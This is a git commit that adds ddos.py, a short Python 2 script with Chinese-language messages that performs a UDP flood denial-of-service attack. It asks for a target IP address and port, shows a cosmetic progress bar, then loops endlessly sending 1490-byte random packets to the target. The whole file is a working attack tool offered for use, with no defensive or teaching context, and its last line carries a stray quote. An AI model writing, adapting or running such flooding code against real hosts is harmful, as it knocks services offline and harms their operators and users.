2930e97810e76c2e49ee002a37c9d78ad3fa60c0
Dawn Dream/xm2020 <64729945+Dawn-Dream@users.noreply.github.com>
2020-11-04 09:06:58 +0800

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,47 @@
+ 
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "原作者   : HA-MRX"
+print "优化     : DawnDream"
+print "优化内容 : 扫端口攻击改为单端口攻击"
+print
+ip = raw_input("IP 地址 : ")
+port = input("攻击端口       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(1)
+print "[=====               ] 25%"
+time.sleep(1)
+print "[==========          ] 50%"
+time.sleep(1)
+print "[===============     ] 75%"
+time.sleep(1)
+print "[====================] 100%"
+time.sleep(1)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     print "已攻击 %s packet 到 %s throught port:%s"%(sent,ip,port)"
